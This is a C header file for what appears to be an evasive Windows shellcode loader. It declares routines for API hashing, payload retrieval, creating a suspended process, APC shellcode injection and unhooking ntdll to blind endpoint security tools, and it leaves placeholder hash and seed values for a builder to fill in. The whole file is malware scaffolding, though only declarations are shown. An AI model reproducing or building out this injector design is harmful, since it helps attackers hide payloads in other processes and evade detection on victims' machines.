#pragma once
#include <stdint.h>

// API Hashing Part
#define HASHA(API)		(HashStringDjb2A((PCHAR) API))
#define INITIAL_HASH	#-INITIAL_HASH_VALUE-#  
#define INITIAL_SEED	#-INITIAL_SEED_VALUE-# 

BOOL GetContent(OUT PBYTE* pPayload, OUT SIZE_T* sSizeOfPayload);
BOOL CreateSuspendedProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread);
BOOL APCInjection(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress);
HMODULE GetModuleHandleH(DWORD dwModuleNameHash);
FARPROC GetProcAddressH(HMODULE moduleHandle, DWORD hash);

BOOL Unhook(LPVOID module);
LPVOID MapNtdll();

typedef BOOL (WINAPI* cCPA)(LPCSTR lpApplicationName,LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles,DWORD dwCreationFlags, LPVOID lpEnvironment,LPCSTR lpCurrentDirectory,LPSTARTUPINFOA lpStartupInfo,LPPROCESS_INFORMATION lpProcessInformation);
typedef BOOL (WINAPI* cDAPS)(DWORD dwProcessId);